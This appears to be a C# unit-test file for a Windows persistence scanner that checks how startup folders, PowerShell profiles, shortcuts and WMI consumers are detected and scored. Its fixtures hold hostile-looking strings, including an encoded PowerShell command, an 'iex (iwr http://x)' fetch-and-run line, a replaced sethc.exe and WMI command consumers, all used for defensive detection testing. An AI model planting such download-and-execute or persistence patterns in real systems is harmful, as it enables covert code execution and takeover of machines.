using System.Text;
using PCPorter.Collectors.Persistence;
using PCPorter.Collectors.Sources;
using PCPorter.TestKit;

namespace PCPorter.Collectors.Tests.Persistence;

public class FilePersistenceTests : IDisposable
{
    readonly string _root = Directory.CreateTempSubdirectory("pcporter-filep").FullName;
    public void Dispose()
    {
        // A fresh .lnk can be briefly held open by the shell or antivirus; retry instead of failing the test.
        for (int i = 0; ; i++)
        {
            try { Directory.Delete(_root, true); return; }
            catch (IOException) when (i < 20) { Thread.Sleep(250); }
        }
    }

    string Bob => Path.Combine(_root, "Users", "bob");
    UserProfile BobProfile => new(P.BobSid, "bob", Bob, null);

    string Make(string relative, string content = "")
    {
        var p = Path.Combine(_root, relative);
        Directory.CreateDirectory(Path.GetDirectoryName(p)!);
        File.WriteAllText(p, content);
        return p;
    }

    FakeSystemSource Source(RegSpec? ntuser = null, bool live = false) =>
        new(_root, RegSpec.Root(), RegSpec.Root(), ntuser is null ? null : new Dictionary<string, RegSpec> { [P.BobSid] = ntuser }, [BobProfile], live);

    [Fact]
    public void Startup_folder_scripts_profiles_and_office_files_are_listed()
    {
        Make(@"ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\go.bat", "@echo off\r\npowershell -enc SQBFAFgA\r\n");
        Make(@"ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini", "[.ShellClassInfo]");
        Make(@"Users\bob\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hello.vbs", "MsgBox 1");
        Make(@"Users\bob\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1", "Set-Alias ll Get-ChildItem");
        Make(@"Users\bob\Documents\PowerShell\profile.ps1", "iex (iwr http://x)");
        Make(@"Users\bob\OneDrive\Documents\WindowsPowerShell\profile.ps1", "# hi");
        Make(@"Windows\System32\WindowsPowerShell\v1.0\profile.ps1", "# all users");
        Make(@"Users\bob\AppData\Roaming\Microsoft\Word\STARTUP\macros.dotm", "x");
        Make(@"Users\bob\AppData\Roaming\Microsoft\Excel\XLSTART\book.xlam", "x");
        Make(@"Windows\System32\sethc.exe", "MZ");

        var nt = RegSpec.Root().Key(@"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\StartupFolder", k => k.Bin("hello.vbs", 0x03, 0, 0, 0));
        var src = Source(nt);
        var entries = FilePersistence.Read(src, null, new List<string>());
        Assert.DoesNotContain(entries, e => e.Name == "desktop.ini");

        var bat = Assert.Single(entries, e => e.Name == "go.bat");
        Assert.Equal("Startup folder (all users)", bat.Location);
        Assert.Equal(@"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\go.bat", bat.Payload);
        Assert.Contains("-enc", bat.ScriptText);

        var vbs = Assert.Single(entries, e => e.Name == "hello.vbs");
        Assert.True(vbs.Disabled);
        Assert.Equal("Startup folder (bob)", vbs.Location);

        Assert.Equal(4, entries.Count(e => e.Location.StartsWith("PowerShell")));
        Assert.Single(entries, e => e.Location == "Word startup folder (bob)");
        Assert.Single(entries, e => e.Location == "Excel startup folder (bob)");
        Assert.Single(entries, e => e.Kind == EntryKind.Accessibility && e.Name == "sethc.exe");

        var items = P.Score(src, entries, new FakeSignatures(_ => FakeSignatures.Unsigned));
        Assert.Equal("SUSPICIOUS_COMMAND", items.Single(i => i.Name == "go.bat").RuleId);
        Assert.Equal("SUSPICIOUS_COMMAND", items.Single(i => i.Name == "profile.ps1" && i.Location.StartsWith("PowerShell 7")).RuleId);
        Assert.Equal("ACCESSIBILITY_REPLACED", items.Single(i => i.Name == "sethc.exe").RuleId);
        var hello = items.Single(i => i.Name == "hello.vbs");
        Assert.True(hello.Disabled);
        Assert.Equal(Severity.Medium, hello.Severity);   // script in AppData = High, disabled = one lower
    }

    [Fact]
    public void Shortcut_is_parsed_as_binary_lnk()
    {
        var dir = Directory.CreateDirectory(Path.Combine(Bob, @"AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")).FullName;
        var target = Make(@"Users\bob\AppData\Local\Tool\tool.exe", "MZ");
        var lnk = Path.Combine(dir, "Tool.lnk");
        CreateShortcut(lnk, target, "--tray");

        var (t, args, _) = FilePersistence.ReadShortcut(lnk);
        Assert.NotNull(t);
        Assert.EndsWith(@"\Users\bob\AppData\Local\Tool\tool.exe", t, StringComparison.OrdinalIgnoreCase);   // temp path may be 8.3 in `target`
        Assert.True(File.Exists(target));
        Assert.Equal("--tray", args);

        var entries = FilePersistence.Read(Source(), null, new List<string>());
        var e = Assert.Single(entries, x => x.Name == "Tool.lnk");
        Assert.Contains("--tray", e.Command);
    }

    [Fact]
    public void Corrupt_shortcut_is_a_warning_not_an_exception()
    {
        Make(@"ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\bad.lnk", "not a shortcut");
        var warnings = new List<string>();
        var entries = FilePersistence.Read(Source(), null, warnings);
        Assert.Single(entries, e => e.Name == "bad.lnk" && e.NoFile);
        Assert.Contains(warnings, w => w.Contains("bad.lnk"));
    }

    [Fact]
    public void Wmi_bound_consumers_are_found_live_only()
    {
        var wmi = new FakeWmiClient()
            .Add(@"root\subscription", "__FilterToConsumerBinding",
                new Dictionary<string, object?> { ["Filter"] = @"__EventFilter.Name=""f""", ["Consumer"] = @"CommandLineEventConsumer.Name=""Updater""" },
                new Dictionary<string, object?> { ["Filter"] = @"__EventFilter.Name=""g""", ["Consumer"] = @"ActiveScriptEventConsumer.Name=""Scr""" })
            .Add(@"root\subscription", "CommandLineEventConsumer",
                new Dictionary<string, object?> { ["Name"] = "Updater", ["CommandLineTemplate"] = @"C:\Windows\System32\cmd.exe /c C:\x.exe" },
                new Dictionary<string, object?> { ["Name"] = "Unbound", ["CommandLineTemplate"] = @"C:\y.exe" })
            .Add(@"root\subscription", "ActiveScriptEventConsumer",
                new Dictionary<string, object?> { ["Name"] = "Scr", ["ScriptingEngine"] = "VBScript", ["ScriptText"] = "CreateObject(\"WScript.Shell\").Run \"calc\"" });

        var live = FilePersistence.Read(Source(live: true), wmi, new List<string>()).Where(e => e.Kind == EntryKind.WmiConsumer).ToList();
        Assert.Equal(["Scr", "Updater"], live.Select(e => e.Name).Order());
        var items = P.Score(Source(live: true), live);
        Assert.All(items, i => Assert.Equal(("WMI_CONSUMER", Severity.High), (i.RuleId, i.Severity)));

        var offline = FilePersistence.Read(Source(live: false), wmi, new List<string>());
        Assert.DoesNotContain(offline, e => e.Kind == EntryKind.WmiConsumer);
    }

    [Fact]
    public void Wmi_access_denied_is_a_warning()
    {
        var wmi = new FakeWmiClient().Fail(@"root\subscription", "__FilterToConsumerBinding", WmiOutcome.AccessDenied);
        var warnings = new List<string>();
        FilePersistence.Read(Source(live: true), wmi, warnings);
        Assert.Contains(warnings, w => w.Contains("AccessDenied"));
    }

    /// <summary>Test-only: writes a real .lnk with the Windows Script Host (the code under test parses it as binary).</summary>
    static void CreateShortcut(string lnk, string target, string args)
    {
        var type = Type.GetTypeFromProgID("WScript.Shell") ?? throw new InvalidOperationException("WScript.Shell not available");
        dynamic shell = Activator.CreateInstance(type)!;
        try
        {
            dynamic sc = shell.CreateShortcut(lnk);
            try
            {
                sc.TargetPath = target;
                sc.Arguments = args;
                sc.Save();
            }
            finally { System.Runtime.InteropServices.Marshal.FinalReleaseComObject(sc); }
        }
        finally { System.Runtime.InteropServices.Marshal.FinalReleaseComObject(shell); }
    }
}
